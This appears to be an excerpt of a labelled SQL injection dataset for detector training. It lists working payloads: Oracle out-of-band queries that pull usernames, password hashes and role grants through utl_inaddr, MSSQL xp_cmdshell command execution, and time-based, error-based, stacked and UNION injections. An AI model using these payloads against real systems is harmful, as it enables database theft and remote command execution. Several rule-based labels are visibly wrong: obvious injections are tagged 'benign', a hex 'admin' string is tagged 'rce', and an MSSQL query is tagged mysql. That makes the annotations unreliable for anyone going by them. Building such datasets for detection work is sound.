row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
41370,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=7)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41371,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=7)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41372,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=7)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41373,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=7)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41374,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=7)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41375,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(USERNAME) FROM (SELECT DISTINCT(USERNAME), ROWNUM AS LIMIT FROM SYS.ALL_USERS) WHERE LIMIT=8)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41376,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(PASSWORD) FROM (SELECT DISTINCT(PASSWORD), ROWNUM AS LIMIT FROM SYS.USER$) WHERE LIMIT=8)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41377,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(table_name) FROM (SELECT DISTINCT(table_name), ROWNUM AS LIMIT FROM sys.all_tables) WHERE LIMIT=8)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41378,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(column_name) FROM (SELECT DISTINCT(column_name), ROWNUM AS LIMIT FROM all_tab_columns) WHERE LIMIT=8)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41379,"' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=8)) AND 'i'='i",1,,out_of_band,oracle,0.95,utl_inaddr detected — out_of_band injection (priority 2) on oracle,rule-based
41380,"1,2,3--",1,union_versioned_comment,unknown,unknown,0.5,Insufficient information to classify,rule-based
41381,"NULL,NULL--",1,union_versioned_comment,benign,generic,0.8,No attack signals detected in payload,rule-based
41382,1 SELECT*/NULL--,1,union_versioned_comment,benign,generic,0.8,No attack signals detected in payload,rule-based
41383,"1+ + +NULL,NULL--",1,union_versioned_comment,benign,generic,0.8,No attack signals detected in payload,rule-based
41384,"1 UNION SELECT 1,2,3--",1,union_comment_bypass,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
41385,"' UNION SELECT 0x61646d696e,0x61646d696e--",1,union_hex,rce,generic,0.95,0x61646d696e detected — rce injection (priority 1) on generic,rule-based
41386,1 AND 0x61=0x61,1,boolean_hex,benign,generic,0.8,No attack signals detected in payload,rule-based
41387,' OR 0x313d31--,1,boolean_hex,benign,generic,0.8,No attack signals detected in payload,rule-based
41388,CHAR(39)||'OR'||CHAR(39)||'1'||CHAR(61)||CHAR(39)||'1',1,char_encoding,benign,generic,0.8,No attack signals detected in payload,rule-based
41389,"' UNION SELECT CHAR(65,68,77,73,78),NULL--",1,union_char,union_based,generic,0.95,UNION SELECT detected — union_based injection (priority 7) on generic,rule-based
41390,'; EXEC xp_cmdshell('whoami')--,1,mssql_rce,rce,mssql,0.95,xp_cmdshell detected — rce injection (priority 1) on mssql,rule-based
41391,1; WAITFOR DELAY '0:0:5'--,1,mssql_timebased,time_blind,mssql,0.95,WAITFOR DELAY is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41392,'; WAITFOR DELAY '00:00:05'--,1,mssql_timebased,time_blind,mssql,0.95,WAITFOR DELAY is MSSQL-specific time-delay function — time-based blind inference (priority 5),rule-based
41393,"' AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects WHERE xtype='U'))--",1,mssql_error,error_based,mssql,0.95,CONVERT(int detected — error_based injection (priority 4) on mssql,rule-based
41394,'; DECLARE @q NVARCHAR(4000);SET @q=0x73656c656374;EXEC(@q)--,1,mssql_dynamic,rce,generic,0.95,0x73656c656374 detected — rce injection (priority 1) on generic,rule-based
41395,1;SELECT TOP 1 table_name FROM information_schema.tables--,1,mssql_enum,stacked_queries,mysql,0.95,;SELECT  detected — stacked_queries injection (priority 3) on mysql,rule-based
41396,"' UNION SELECT NULL,NULL,NULL FROM sysobjects--",1,mssql_union,union_based,mssql,0.95,UNION SELECT detected — union_based injection (priority 7) on mssql,rule-based
41397,' UNION SELECT NULL FROM dual--,1,oracle_union,union_based,oracle,0.95,UNION SELECT detected — union_based injection (priority 7) on oracle,rule-based
41398,' AND 1=UTL_INADDR.GET_HOST_ADDRESS('localhost')--,1,oracle_oob,out_of_band,oracle,0.95,UTL_INADDR detected — out_of_band injection (priority 2) on oracle,rule-based
41399,1 AND ROWNUM=1 AND 1=1--,1,oracle_boolean,boolean_blind,oracle,0.95,AND 1=1 detected — boolean_blind injection (priority 8) on oracle,rule-based
